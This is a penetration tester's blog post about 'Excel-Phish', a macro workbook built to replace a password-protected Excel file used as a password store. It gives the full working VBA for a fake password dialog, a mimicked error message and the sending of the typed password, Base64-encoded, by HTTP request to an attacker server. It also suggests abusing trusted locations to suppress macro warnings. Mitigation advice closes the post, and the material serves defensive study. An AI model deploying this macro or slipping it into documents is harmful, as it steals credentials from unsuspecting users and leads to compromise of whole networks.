---
title: "Excel-Phish - Phish protected Excel-file passwords"
layout: "post"
---

This post will cover a little Excel Macro project by <a href="https://twitter.com/0x23353435">@0x23353435</a> and me. It was made during an engagement at a customers environment. They were using a password protected Excel-file as password manager. This post will show how to attack such szenarios and why people should not use this method for password storage.
<!--more-->
## Introduction

Excel gives users the option of assigning a password to the sheet so that it is protected from unauthorized access. This can be done under the `File` -> `Info` -> `Protect Workbook` -> `Encrypt with Password` tab:

<p align="center">
          <img src="/assets/posts/ExcelPhish/ProtectWorkbook.JPG">
</p>

If you find and open a password protected Excel-Sheet it will look like this:

<p align="center">
          <img src="/assets/posts/ExcelPhish/Protected.JPG">
</p>

0x23353435 and me were at a customers environment for an internal penetrationtest earlier this year. In order to make the criticality of the found vulnerabilities clear, we usually show the customer the worst case - if agreed. With the highest privileges, it is just a matter of time before the attacker reaches his given goal. We already achieved the goals from `Domain Administrator` to `Global Admin` for the Azure-Cloud and access to `protected networks`. However, we had not managed to gain access to the password manager of the internal IT. Accordingly, access to firewalls, switches, etc. was not yet ensured. However, we already found out that a password protected Excel-file is used for these passwords. It was located in the file servers network-share of the administrators team. Only group members of their team had read and write permissions here. We had some administrators credentials at this point so we also had write permissions on this share. Our first attempt to access the missing passwords took place using <a href="https://github.com/openwall/john/blob/bleeding-jumbo/run/office2john.py">office2john.py</a>. Getting a crackable hash from the protected Excel-file is as simple as follows:

```batch
python office2john.py Protected.xlsx > Excelhash.txt
```

If the set password is not complex enough, it can be cracked using <a href="https://github.com/openwall/john">john</a> or <a href="https://hashcat.net/hashcat/">hashcat</a> using the generated hash. We did not succeed in cracking the password for the Excel password manager, because a complex password was chosen. We had one more day to gain access to the file and thus the remaining passwords. So in the evening we sat down with a few beers in the hotel and brainstormed about how we could get access to the remaining passwords. Another way to get access would have been to compromise the administrators clients computers, connect them to our C2-Server and capture the password via keylogger. However, this way is quite noisy, as all admins would need to be compromised at the same time. After all, we did not know which person opens the file and when. Our consideration was therefore to replace the Excel password manager with a separate Excel file containing a self-written macro. This Phishing-file should behave the same as the password protected Excel-file and send the password to our attacker system.

## Writing Excel-Phish

Writing the macro we needed was actually pretty straight forward. To get our Excel sheet behave like the "Password Manager" we inserted a new form in the VBA Editor:

<p align="center">
          <img src="/assets/posts/ExcelPhish/UserForm.JPG">
</p>

To match the password protected Excel sheets form asking for a password we named it `Password` and put two labels with the text `'Filename.xlsx' is protected` and `Password:` in the corresponding positions:

<p align="center">
          <img src="/assets/posts/ExcelPhish/Labels.JPG">
</p> 

Adding two `CommandButtons` and one `Text-Box` results in a window which looks like the password protected Excel-file's Text-Box:

<p align="center">
          <img src="/assets/posts/ExcelPhish/Buttons.JPG">
</p>

Now we thought about how to exfiltrate the password. There are several ways and each one has its pros and cons. In this specific case we had an attacker system on the same network so it was the easiest way to exfiltrate the password via Web-Request to our webserver. If you don't have a system on the same network you can also exfiltrate the password via for example DNS. We wanted the password to be encoded before sending it, so we searched for a VBA Base64 function and found it on the web:

```batch
Function EncodeBase64(text As String) As String
  Dim arrData() As Byte
  arrData = StrConv(text, vbFromUnicode)

  Dim objXML As MSXML2.DOMDocument60
  Dim objNode As MSXML2.IXMLDOMElement

  Set objXML = New MSXML2.DOMDocument60
  Set objNode = objXML.createElement("b64")

  objNode.DataType = "bin.base64"
  objNode.nodeTypedValue = arrData
  EncodeBase64 = objNode.text

  Set objNode = Nothing
  Set objXML = Nothing
End Function
```

To exfiltrate the phished password from the TextBox to our webserver, we used the following code:

```batch
Dim xmlhttp As New MSXML2.xmlhttp60, myurl As String
myurl = "http://192.168.100.128/" + EncodeBase64(TextBox1.text)
xmlhttp.Open "GET", myurl, False
xmlhttp.Send
```

To make it look more legit for the enduser, we moved the original Excel-file to a hidden folder in the same network share and added the following code to open up the original document after password submission:

```batch
On Error Resume Next
Dim Path As String
Path = Application.ActiveWorkbook.Path
Dim src As Workbook
On Error GoTo WrongPWD
Set src = Workbooks.Open(Path + "\Hidden\PasswordSafe.xlsx", True, True, Password:=TextBox1.text)
ThisWorkbook.Activate
Worksheets("Sheet1") = src.Worksheets("sheet1")
```
If the correct password is entered, the current Excel-file will be closed and the original one will be opened using the password. 

But what happens in the original file, when the user enters a wrong password? Let's try that out:

<p align="center">
          <img src="/assets/posts/ExcelPhish/WrongPass.JPG">
</p>

We can ensure, that the same error message appears in our Phishing file with the following code:

```batch
WrongPWD:
  
    If Err.Number = 1004 Then
        MsgBox "The password you supplied is not correct. Verify that the CAPS LOCK key is off and be sure to use the correct capitalization.", vbExclamation, "Microsoft Excel"
  
```

The full script behind the userform looks like this now:

```batch
Private Sub CommandButton1_Click()
On Error Resume Next
Dim Path As String
Path = Application.ActiveWorkbook.Path
Dim src As Workbook
On Error GoTo WrongPWD
Set src = Workbooks.Open(Path + "\Hidden\PasswordSafe.xlsx", True, True, Password:=TextBox1.text)
ThisWorkbook.Activate
Worksheets("Sheet1") = src.Worksheets("sheet1")
WrongPWD:
  
    If Err.Number = 1004 Then
        MsgBox "The password you supplied is not correct. Verify that the CAPS LOCK key is off and be sure to use the correct capitalization.", vbExclamation, "Microsoft Excel"
    Else
        Dim xmlhttp As New MSXML2.xmlhttp60, myurl As String
        myurl = "http://192.168.100.128/" + EncodeBase64(TextBox1.text)
        xmlhttp.Open "GET", myurl, False
        xmlhttp.Send
        ActiveWorkbook.Close False
    End If
End Sub

Private Sub CommandButton2_Click()
Workbooks.Close
End Sub
Function EncodeBase64(text As String) As String
  Dim arrData() As Byte
  arrData = StrConv(text, vbFromUnicode)

  Dim objXML As MSXML2.DOMDocument60
  Dim objNode As MSXML2.IXMLDOMElement

  Set objXML = New MSXML2.DOMDocument60
  Set objNode = objXML.createElement("b64")

  objNode.DataType = "bin.base64"
  objNode.nodeTypedValue = arrData
  EncodeBase64 = objNode.text

  Set objNode = Nothing
  Set objXML = Nothing
End Function

Private Sub Label2_Click()

End Sub

Private Sub UserForm_Click()

End Sub
```

What about the appearance of our final Excel-Phish file? In my personal opinion it looks pretty much like the original file:

<p align="center">
          <img src="/assets/posts/ExcelPhish/ExcelPhish.JPG">
</p>

What about the Exfiltration? When the user enters the correct password it is send to our attacker webserver and can be easily decoded:

<p align="center">
          <img src="/assets/posts/ExcelPhish/Exfiltration.JPG">
</p>

And Voila, access to the password protected file is given without cracking and without a keylogger. In our customers environment we got access to the Excel "Password Manager" by using this Excel-Phish document. Therefore, administrative access to all systems in the environment was given.

Excel-Phish can be found on my github page:

<a href="https://github.com/S3cur3Th1sSh1t/Excel-Phish">https://github.com/S3cur3Th1sSh1t/Excel-Phish</a>

## Further Considerations

There was one more thing we didn't want to happen. After adding macros to an Excel file the users will most likely see a "Warning" button which has to be enabled before our MessageBox pops up.

<p align="center">
          <img src="/assets/posts/ExcelPhish/Warning.JPG">
</p>

In the given environment we were lucky, that the `PasswordSafe.xlsx` was lying in a trusted location network share. It is possible to specify trusted locations on the local computer and trusted locations via GPO. For every trusted location, no warning windows will appear and all macros are executed directly. So backdooring Excel-files in a network share specified as trusted location can provide many C2-connections in some environments. You can look them up in the Office Trust Center, which is in the Excel options menu:

<p align="center">
          <img src="/assets/posts/ExcelPhish/TrustedLocations.JPG">
</p>

With given credentials for your target account, it is also possible to login with those credentials and mark our fake Excel-Phish document as "trusted" by enabling the macros one time by ourself. Thats because normally the warning pops only one time on the first execution.

## Mitigation

First and most importantly, any vulnerabilities and misconfigurations that allow an attacker to elevate privileges in an Active Directory environment should be addressed. If the quick elevation of privileges can be prevented, attacks like the one listed here are not easily possible. At least not if the permissions for network shares have been configured properly.

One thing should be clear: Never use Excel-files - even password protected as password manager. There are better and safer ways for password storage. Our recommendation is using a centralized Password manager solution accessible only via Multi-factor-Authentication. Optimally, the solution should support a role and authorization concept.

The best way to protect against macros in office documents is allowing only digitally signed macros:

<p align="center">
          <img src="/assets/posts/ExcelPhish/SignedMacros.JPG">
</p>

## Conclusion

We showed a way to get the cleartext password of password protected Excel-files via macro and phishing. To do so, you "only" need write permissions on the original document.

Cracking a weak password or using a keylogger are alternatives for a situation like that.

Don't use Excel-files for your passwords and allow only digitally signed macros if possible. Check your trusted locations - maybe they can be configured more restrictive.

## Links & Resources

* My colleague who build this macro with me on a beer in the evening - <a href="https://twitter.com/0x23353435">https://twitter.com/0x23353435</a>
* office2john.py - <a href="https://github.com/openwall/john/blob/bleeding-jumbo/run/office2john.py">https://github.com/openwall/john/blob/bleeding-jumbo/run/office2john.py</a>
* John - <a href="https://github.com/openwall/john/">https://github.com/openwall/john/</a>
* Hashcat - <a href="https://hashcat.net/hashcat/">https://hashcat.net/hashcat/</a>
